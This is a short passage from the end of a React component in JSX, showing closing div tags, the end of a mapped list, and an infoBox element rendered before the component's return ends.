          </div>
        ))}
      </div>
      {infoBox}
    </div>
  );
}
